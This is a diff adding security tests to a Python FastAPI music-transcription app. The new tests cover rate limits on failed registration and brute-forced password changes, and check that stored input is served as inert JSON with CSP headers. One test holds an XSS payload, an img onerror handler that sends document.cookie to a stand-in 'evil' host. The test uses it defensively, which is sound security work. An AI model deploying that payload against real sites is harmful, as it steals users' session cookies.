@@ -95,6 +95,10 @@ def test_transcribe_basic_pitch_detects_440hz():
     import pytest
     if not bp_amt.available():
         pytest.skip("basic_pitch unavailable")
+    try:
+        bp_amt.transcribe([0.0] * 1600, 16000)
+    except Exception:
+        pytest.skip("basic-pitch engine not runnable (missing tflite/tf runtime)")
     client = TestClient(app)
     data = make_sine_wav(freq=440.0, duration=1.2)
     r = client.post("/api/music/transcribe", files={"file": ("t.wav", data, "audio/wav")}, data={"bpm": "60", "engine": "basic_pitch"})
@@ -141,6 +145,85 @@ def test_task_api_roundtrip():
     assert isinstance(r.json(), list)
 
 
+def test_register_failure_bucket_limits(monkeypatch):
+    import uuid as _uuid
+
+    from app import rate_limit
+    from app.api import auth as auth_mod
+
+    monkeypatch.setattr(settings, "register_failure_ip_limit", 3, raising=False)
+    rate_limit.reset()
+    auth_mod._register_ip_failures.pop("regfail:testclient", None)
+    try:
+        client = TestClient(app)
+        codes = []
+        for i in range(5):
+            r = client.post("/api/auth/register", json={
+                "username": f"regfail{_uuid.uuid4().hex[:8]}",
+                "email": f"rf{i}@x.local",
+                "password": "OkPass#2026x",
+                "invite_code": "SAI-MA-MOI-XX",
+            })
+            codes.append(r.status_code)
+        assert codes[:3] == [400, 400, 400], codes
+        assert codes[3:] == [429, 429], codes
+    finally:
+        auth_mod._register_ip_failures.pop("regfail:testclient", None)
+
+
+def test_change_password_bruteforce_locked():
+    import uuid as _uuid
+
+    uname = f"chgbrute{_uuid.uuid4().hex[:10]}"
+    client = TestClient(app)
+    r = client.post("/api/auth/register", json={
+        "username": uname, "email": f"{uname}@x.local",
+        "password": "Victim#2026a", "invite_code": "TESTINVITE",
+    })
+    assert r.status_code == 200
+    tok = r.json()["token"]
+    codes = []
+    for i in range(8):
+        r = client.post("/api/auth/change-password", json={
+            "old_password": f"WrongBrute#{i}xx",
+            "new_password": "NewPass#2026z",
+        }, headers={"Authorization": f"Bearer {tok}"})
+        codes.append(r.status_code)
+    assert codes[:4] == [401, 401, 401, 401], codes
+    assert all(code == 429 for code in codes[4:]), codes
+    r = client.post("/api/auth/change-password", json={
+        "old_password": "Victim#2026a", "new_password": "NewPass#2026z",
+    }, headers={"Authorization": f"Bearer {tok}"})
+    assert r.status_code == 200
+    new_tok = r.json()["token"]
+    me = client.get("/api/auth/me", headers={"Authorization": f"Bearer {new_tok}"})
+    assert me.status_code == 200
+    assert me.json()["username"] == uname
+
+
+def test_task_params_payload_stored_inert():
+    payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
+    client = TestClient(app)
+    r = client.post(
+        "/api/task",
+        params={"kind": "generic"},
+        json={"note": payload, "params": {"q": payload}},
+    )
+    assert r.status_code == 200
+    tid = r.json()["id"]
+    r = client.get(f"/api/task/{tid}")
+    assert r.status_code == 200
+    assert r.headers.get("content-type", "").startswith("application/json")
+    assert "text/html" not in r.headers.get("content-type", "")
+    assert "default-src" in r.headers.get("content-security-policy", "")
+    assert r.headers.get("x-content-type-options", "").lower() == "nosniff"
+    body = r.json()
+    assert body["params"]["note"] == payload
+    listed = client.get("/api/task")
+    assert listed.headers.get("content-type", "").startswith("application/json")
+    assert "text/html" not in listed.headers.get("content-type", "")
+
+
 def test_musicxml_dotted_output():
     from app.services import musicxml_service
 
@@ -153,13 +236,24 @@ def test_musicxml_dotted_output():
 def test_task_dispatch_inline(monkeypatch):
     from app.workers import queue as task_queue
     from app.storage import manager as storage_manager
+    from app.database import crud
+    from app.database.session import SessionLocal
 
     monkeypatch.setattr(task_queue, "_enqueue_rq", lambda *a, **k: False)
     wav = make_sine_wav(freq=523.25, duration=0.8)
-    audio_path = storage_manager.temp_dir() / "clip.wav"
+    digest = storage_manager.sha256_bytes(wav)
+    audio_path = storage_manager.original_dir() / f"{digest}.wav"
+    audio_path.parent.mkdir(parents=True, exist_ok=True)
     audio_path.write_bytes(wav)
+    db = SessionLocal()
+    try:
+        item = crud.create_item(db, "Dispatch Tone", "bai_hat", digest, "dispatch.wav", len(wav))
+        crud.create_audio(db, item.id, "original", str(audio_path), digest, len(wav))
+        heritage_id = item.id
+    finally:
+        db.close()
     client = TestClient(app)
-    r = client.post("/api/task", json={"params": {"audio_path": str(audio_path), "bpm": 60}}, params={"kind": "transcribe"})
+    r = client.post("/api/task", json={"heritage_id": heritage_id, "params": {"bpm": 60}}, params={"kind": "transcribe"})
     assert r.status_code == 200
     tid = r.json()["id"]
     import time as _time
